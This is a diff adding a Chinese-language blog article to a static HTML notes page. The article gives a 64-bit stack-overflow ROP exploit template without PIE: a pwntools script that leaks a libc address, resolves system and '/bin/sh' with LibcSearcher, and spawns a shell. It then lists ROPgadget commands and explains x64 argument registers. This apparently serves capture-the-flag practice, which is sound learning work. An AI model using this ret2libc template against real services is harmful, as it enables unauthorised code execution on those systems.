@@ -62,6 +62,14 @@
                                     
                                 
                             
+                                
+                                    
+                                        <li>
+                                            <a href="#njtkvy3moijmuqllh7pyb3dmqkhmnb8o5peguelfkq">64位栈溢出rop模板(无PIE)</a>
+                                        </li>
+                                    
+                                
+                            
                         </ul>
                     </nav>
                 </header>
@@ -69,6 +77,65 @@
             
                 <div id="main">
 
+                    
+                        
+                            
+                                <article id="njtkvy3moijmuqllh7pyb3dmqkhmnb8o5peguelfkq">
+                                    <h2 class="major">64位栈溢出rop模板(无PIE)</h2>
+                                    <span class="image main"><img src="" alt="" /></span>
+                                    <h1 id="64位栈溢出rop模板无pie">64位栈溢出rop模板（无PIE）</h1>
+<h2 id="exp模板">exp模板</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!usr/bin/env python</span>
+<span style="color:#75715e">#coding=utf-8</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+<span style="color:#75715e">#p = process(&#34;./&#34;)</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;&#34;</span>,)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./&#34;</span>)
+
+read_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>]
+puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+main_addr <span style="color:#f92672">=</span> 
+pop_rdi <span style="color:#f92672">=</span> 
+<span style="color:#75715e">#************泄露got*********</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>() <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(read_got)
+payload<span style="color:#f92672">+=</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(main_addr) 
+<span style="color:#75715e">#payload = payload.ljust(200,&#39;b&#39;)</span>
+p<span style="color:#f92672">.</span>sendline( payload)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;&#39;</span>)
+read_addr <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+print hex(read_addr)
+<span style="color:#75715e">#*****************************</span>
+<span style="color:#75715e">#***********搜索libc，寻址*******</span>
+libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#34;read&#34;</span>,read_addr)
+offset <span style="color:#f92672">=</span> read_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;read&#34;</span>)
+sys_addr <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;system&#34;</span>)
+bin_sh_addr <span style="color:#f92672">=</span> offset <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;str_bin_sh&#34;</span>)
+<span style="color:#75715e">#***************************</span>
+<span style="color:#75715e">#************get shell************</span>
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x40</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> p64(pop_rdi) <span style="color:#f92672">+</span> p64(bin_sh_addr) 
+payload1<span style="color:#f92672">+=</span> p64(sys_addr) 
+payload1 <span style="color:#f92672">=</span> payload1<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">200</span>,<span style="color:#e6db74">&#39;b&#39;</span>)
+
+p<span style="color:#f92672">.</span>sendline(payload1)
+
+p<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div><h2 id="ropgadget">ROPgadget</h2>
+<p>ROPgadget &ndash;binary rop  &ndash;only &lsquo;pop|ret&rsquo; | grep &lsquo;eax&rsquo;
+查找可存储寄存器的代码</p>
+<p>ROPgadget &ndash;binary rop &ndash;string &ldquo;/bin/sh&rdquo;
+查找字符串</p>
+<p>ROPgadget &ndash;binary rop  &ndash;only &lsquo;int&rsquo;
+查找有int 0x80的地址</p>
+<h2 id="64位传参">64位传参</h2>
+<p>对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。</p>
+
+                                </article>
+                            
+                        
                     
                         
                             
